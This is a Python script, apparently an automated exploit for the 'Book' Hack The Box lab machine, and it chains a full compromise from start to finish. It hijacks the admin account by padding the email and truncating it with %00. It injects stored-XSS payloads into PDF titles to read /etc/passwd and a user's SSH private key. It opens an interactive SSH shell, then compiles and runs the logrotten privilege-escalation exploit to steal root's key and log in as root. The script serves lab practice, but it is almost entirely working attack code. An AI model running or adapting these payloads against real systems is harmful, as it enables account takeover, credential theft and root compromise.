#!/usr/bin/python
#-*- coding: utf-8 -*-
import random ,string
import requests
import subprocess
import time as t
from colorama import Fore, Back, Style
from requests_toolbelt import MultipartEncoder
import paramiko
from tqdm.auto import tqdm


#global variables 

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
headers = {"Host":"10.10.10.176","Content-Length": "59","Cache-Control": "max-age=0","Upgrade-Insecure-Requests": "1","Content-Type": "application/x-www-form-urlencoded","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","Referer": "http://10.10.10.176/","Accept-Encoding": "gzip, deflate","Accept-Language": "en-US,en;q=0.9"}

#banner
banner =("                                                                                 "
"\n\033[2;40;32m ██████\033[0;40;31m╗ \033[2;40;32m ██████\033[0;40;31m╗ \033[2;40;32m ██████\033[0;40;31m╗ \033[2;40;32m██\033[0;40;31m╗ \033[2;40;32m  ██\033[0;40;31m╗ \033[2;40;32m  ██████\033[0;40;31m╗ \033[2;40;32m███████\033[0;40;31m╗\033[2;40;32m █████\033[0;40;31m╗\033[2;40;32m ██████\033[0;40;31m╗\033[2;40;32m ███████\033[0;40;31m╗\033[2;40;32m██████\n"
"\033[2;40;32m ██\033[0;40;31m╔══\033[2;40;32m██\033[0;40;31m╗\033[2;40;32m██\033[0;40;31m╔═══\033[2;40;32m██\033[0;40;31m╗\033[2;40;32m██\033[0;40;31m╔═══\033[2;40;32m██\033[0;40;31m╗\033[2;40;32m██\033[0;40;31m║\033[2;40;32m ██\033[0;40;31m\033[0;40;31m╔╝\033[2;40;32m    ██\033[0;40;31m╔══\033[2;40;32m██\033[0;40;31m╗\033[2;40;32m██\033[0;40;31m╔════╝\033[2;40;32m██\033[0;40;31m╔══\033[2;40;32m██\033[0;40;31m╗\033[2;40;32m██\033[0;40;31m╔══\033[2;40;32m██\033[0;40;31m╗\033[2;40;32m██\033[0;40;31m╔════╝\033[2;40;32m██\033[0;40;31m╔══\033[2;40;32m██\033[0;40;31m╗\033[2;40;32m\n"
" \033[2;40;32m██████\033[0;40;31m╔╝\033[2;40;32m██\033[0;40;31m║   \033[2;40;32m██\033[0;40;31m║\033[2;40;32m██\033[0;40;31m║   \033[2;40;32m██\033[0;40;31m║\033[2;40;32m█████\033[0;40;31m╔╝     \033[2;40;32m██████\033[0;40;31m╔╝\033[2;40;32m█████\033[0;40;31m╗  \033[2;40;32m███████\033[0;40;31m║\033[2;40;32m██\033[0;40;31m║  \033[2;40;32m██\033[0;40;31m║\033[2;40;32m█████\033[0;40;31m╗  \033[2;40;32m██████\033[0;40;31m╔╝\n\033[2;40;32m"
" \033[2;40;32m██\033[0;40;31m╔══\033[2;40;32m██\033[0;40;31m╗\033[2;40;32m██\033[0;40;31m║   \033[2;40;32m██\033[0;40;31m║\033[2;40;32m██\033[0;40;31m║   \033[2;40;32m██\033[0;40;31m║\033[2;40;32m██\033[0;40;31m╔═\033[2;40;32m██\033[0;40;31m╗     \033[2;40;32m██\033[0;40;31m╔══\033[2;40;32m██\033[0;40;31m╗\033[2;40;32m██\033[0;40;31m╔══╝  \033[2;40;32m██\033[0;40;31m╔══\033[2;40;32m██\033[0;40;31m║\033[2;40;32m██\033[0;40;31m║  \033[2;40;32m██\033[0;40;31m║\033[2;40;32m██\033[0;40;31m╔══╝  \033[2;40;32m██\033[0;40;31m╔══\033[2;40;32m██\033[0;40;31m╗\n\033[2;40;32m"
" \033[2;40;32m██████\033[0;40;31m╔╝╚\033[2;40;32m██████\033[0;40;31m╔╝╚\033[2;40;32m██████\033[0;40;31m╔╝\033[2;40;32m██\033[0;40;31m║  \033[2;40;32m██\033[0;40;31m╗    \033[2;40;32m██\033[0;40;31m║  \033[2;40;32m██\033[0;40;31m║\033[2;40;32m███████\033[0;40;31m╗\033[2;40;32m██\033[0;40;31m║  \033[2;40;32m██\033[0;40;31m║\033[2;40;32m██████\033[0;40;31m╔╝\033[2;40;32m███████\033[0;40;31m╗\033[2;40;32m██\033[0;40;31m║  \033[2;40;32m██\033[0;40;31m║\n\033[2;40;32m"
"\033[0;40;31m ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝\n\033[2;40;32m"
"═══════════════════════════════════════════════════════════════════════════════════════"
"\n\033[0;40;31m\033#6  Automated Exploit | Book@HTB | By H4r1 \033[39m ")
print(banner)

def user_singup(user):
	print("")
	i=0
	
	try:
		if(user == "User"):
			print("\033[2;40;32m[*] Trying to create a new user account ....................... ")
			temp_user_name = input("[-]\033[2;40;32m Enter your user name >> "  )
			password = input("[-] Enter the password  >> " )
			rand = random.randint(000,999)
			email = str(temp_user_name) + str(rand) + "@mail.com"
			print("\033[2;40;32m[*] Creating new account with the credentials : \033[0;40;31m" + email + "\033[2;40;32m:\033[0;40;31m" + password + "\033[2;40;32m ")
		elif(user == "Admin"):
			print("\033[2;40;32m[*] Trying to change the password of admin account ............")
			password = input("[-] Enter new password for the admin >> " )
			email = "admin@book.htb                                                                                         %00"
			ogemail = "admin@book.htb"
			print("[*]\033[2;40;32m Changing password of admin account with the credentials : \033[0;40;31m" + ogemail + "\033[2;40;32m:\033[0;40;31m" + password + "\033[2;40;32m ")
			
		while(i <= 4):
			#account creation
			r = requests.get("http://10.10.10.176")
			cookie = r.cookies['PHPSESSID']
			r.close
			url = "http://10.10.10.176/"
			postdata = {"name":user,"email":email,"password":password}
			cookies = {"PHPSESSID": cookie }
			r = requests.post(url,headers=headers,cookies=cookies,data = postdata,proxies=proxies, allow_redirects=False, timeout=12)
			status_code = r.status_code
			r.close
			if(str(status_code) == "302"):
				print("\033[2;40;32m[*] " +user+ " account creation......................................\033[2;40;34m[Done]\033[2;40;32m")
				break
			else:
				if(i == 4):
					
					exit('\033[0;40;31mExploit failed, terminating.')
					
				print("\033[0;40;31m[*] Something wrong trying again................................ ")
				t.sleep(4)
				i +=1
				
			
			
			
	
	except Exception as ex:
		print("\033[0;40;31mError:",ex)
		exit('Exploit failed, terminating.')
	return email,password	




# users auth function 
def auth(user,email,password):
	if(user == "User"):
		url= "http://10.10.10.176/"
	else:
		url= "http://10.10.10.176/admin/"
		
	try:	
		s = requests.session()
		s.cookies.clear()
		r = s.get("http://10.10.10.176")
		cookie = r.cookies['PHPSESSID']
		r.close
		postdata = {"email":email,"password":password}	
		cookies = {"PHPSESSID": cookie }
		r = requests.post(url,headers=headers,cookies = cookies ,data =postdata,proxies = proxies,allow_redirects=False, timeout=10.50)
		status_code = r.status_code
		r.close
		if(str(status_code) == "302"):
			print("\033[2;40;32m[*] "  + user + " authentication........................................\033[2;40;34m[Done]\033[2;40;32m  ")
		else:
			print("\033[2;40;32m[*] "  + user + " authentication ........................................\033[2;40;31m[Failed]")
			exit('Exploit failed, terminating.')
			
		
	except Exception as ex:
		print("\033[0;40;31mError:",ex)
		exit('Exploit failed, terminating.\033[0;40;32m')
	return cookie





#payload injector
def inject_payload(payload,user_session):
	
	try:
		i = 0
		while(i <=5):
			injectionfile = open('hacker.pdf', 'w+')
			fields = [
			('title', payload),
			('author', 'h4r1'),
			('Upload', ('hacker.pdf', injectionfile )),
			('Upload', 'Upload'),]
			data=MultipartEncoder(fields=fields,boundary='----WebKitFormBoundary'+''.join(random.sample(string.ascii_letters+string.digits,16)))
			url = "http://10.10.10.176/collections.php"
			boundary_headers = {"Host":"10.10.10.176","Content-Length": "59","Cache-Control": "max-age=0","Upgrade-Insecure-Requests": "1","Content-Type": data.content_type,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","Referer": "http://10.10.10.176/","Accept-Encoding": "gzip, deflate","Accept-Language": "en-US,en;q=0.9"}
			cookies = {"PHPSESSID": user_session }
			r = requests.post(url,headers=boundary_headers,cookies = cookies,data=data,proxies = proxies,allow_redirects=True, timeout=10.50)
			result = r.text
			r.close
			datalength = len(result)
			realdatalength = int(125)
			if(datalength == realdatalength):
				print("\033[2;40;32m[*] Payload injection...........................................\033[2;40;34m[Done]\033[2;40;32m ")
				break
			else:
				if(i == 5):
					exit()
				i +=1
				print("\033[0;40;31m[*] payload injection failed.................................\033[2;40;34m[Retrying]\033[0;40;31m")
				t.sleep(10)
				
	except Exception as ex:
		print("\033[0;40;31mError",ex)
		exit('Exploit failed, terminating.\033[0;40;32m')
	return 0





def download_file(admin_session,filename):
	url = "http://10.10.10.176/admin/collections.php?type=collections"
	cookies = {"PHPSESSID": admin_session}
	try:
		r = requests.get(url,headers=headers,cookies = cookies,allow_redirects=True, timeout=10.50)
		open(filename + ".pdf", 'wb').write(r.content)
		subprocess.check_output("pdf2txt " + filename+".pdf > " +filename+".txt",shell=True)

		
	except Exception as ex:
		print("\033[0;40;31mError",ex)
		exit('Exploit failed, terminating.\033[0;40;32m')
	return 0




def get_root(machine_user,client):
	i=0
	while(True):
		try:
			print("\033[2;40;32m[*] Uploading exploit ...........................................")
			subprocess.run("scp -r -i ./privatekey ./book_reader/ reader@10.10.10.176:/tmp",shell=True)
			print(".................................................................\033[2;40;34m[Done]\033[2;40;32m")
			commands = ['gcc -o /tmp/book_reader/logrotten /tmp/book_reader/logrotten.c','sh -c "/tmp/book_reader/logrotten -p /tmp/book_reader/payloadfile /home/reader/backups/access.log "& echo "hacker" >> /home/reader/backups/access.log ']
			print("\033[2;40;32m[*] Exploiting ................................................. ")
			for command in commands:
				print ("\033[0;40;31mExecuting >> \033[2;40;32m{}".format( command ))
				stdin , stdout, stderr = client.exec_command(command)
				print(stderr.read().decode())
				print (stdout.read().decode())
			print("\033[2;40;32m[*] Waiting to complete the exploitation ............................................")
			for i in tqdm(range(0,25)):
				t.sleep(1)
			subprocess.run("touch ./root-privatekey",shell=True)
			remotefileth = "/tmp/book_reader/root-privatekey"
			localfilepath="./root-privatekey"
			ftp_client=client.open_sftp()
			ftp_client.get(remotefileth,localfilepath)
			print("\033[2;40;32m[*] Downloading private key ............................................\033[2;40;34m[Done]\033[2;40;32m")
			subprocess.run("chmod 600 ./root-privatekey",shell=True)
			print("\033[2;40;32m[*] Connecting to ssh  ............................................")
			subprocess.run("ssh -i ./root-privatekey root@10.10.10.176",shell=True)
			break
		except Exception as Ex:
			print("\033[0;40;31mError",Ex)
			print("Exploit failed, Retrying.\033[0;40;32m")
			continue


def user_shell(machine_user):
	try:
		key = paramiko.RSAKey.from_private_key_file("./privatekey")
		client = paramiko.SSHClient()
		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		print ("\033[0;40;32m[*]Connecting to SSH............................................")
		client.connect( hostname = "10.10.10.176", username = "reader", pkey = key )
		print ("[*] Command shell opened........................................")
		print ("[*] Type 'root()' to get root user ")
		print ("[*] Type 'exit()' to exit ")
		while(True):
			command = input("\033[0;40;31mDex_Sh3ll >> \033[0;40;32m")
			if(str(command) == "root()"):
				get_root(machine_user,client)
			if(str(command) == "exit()"):
				client.close
				break
				
					
			stdin , stdout, stderr = client.exec_command(command)
			print(stderr.read().decode())
			print (stdout.read().decode())
	except Exception as ex:
		print("\033[0;40;31mError",ex)
		exit('Exploit failed, terminating.\033[0;40;32m')
	return 0







def main():
	try:
		#user account creation & Auth 
		user = 'User'	
		email,password = user_singup(user)
		user_session = auth(user,email,password)
	
		#admin account creation & Auth 
		user = 'Admin'
		ogemail = "admin@book.htb"
		email,password = user_singup(user)
		admin_session = auth(user,ogemail,password)
	
		
		#injecting payload to get passwd file
		read_passwd_file_payload = "<script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open('GET','file:///etc/passwd'); x.send(); </script>"
		flag = inject_payload(read_passwd_file_payload,user_session)
	
	
		
		#downloading etc/passwd file
		print("\033[2;40;32m[*] Downloading passwd file ...................................\033[2;40;34m[Done]\033[2;40;32m")
		filename = "passwd"
		download_file(admin_session,filename)
		tmp_user = subprocess.check_output("cat " +filename + ".txt | grep 1000 | cut -f 1 -d ':'",shell=True)
		machine_user = tmp_user.decode();
		if(machine_user == " "):
			exit('Exploit failed, terminating.')
	
		print("\033[2;40;32m[*] Extracting usernames from the /etc/passwd file .............\033[2;40;34m[Done]\033[2;40;32m")
	
	
	
		#injecting payload to get ID_RSA file
		print("[*] Next payload injection will take a few moments..............\033[0;40;31m")
		for i in tqdm(range(0,100)):
			t.sleep(1)
	
		print("\033[2;40;32m","")
		id_rsa_file_payload = "<script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) };x.open('GET','file:///home/reader/.ssh/id_rsa'); x.send(); </script>"
		flag = inject_payload(id_rsa_file_payload,user_session)
	
	
	
	
		#downloading ID_RSA file
		print("\033[2;40;32m[*] Downloading private-key ....................................\033[2;40;34m[Done]\033[2;40;32m")
		filename = "privatekey"
		download_file(admin_session,filename)
		subprocess.run("expand -t 1 privatekey.txt > privatekey " ,shell=True)
		subprocess.run("chmod 600 privatekey " ,shell=True)
	
	
	
		user_shell(machine_user)
	except Exception as ex:
		print("Error: ", ex)
		exit()





main()
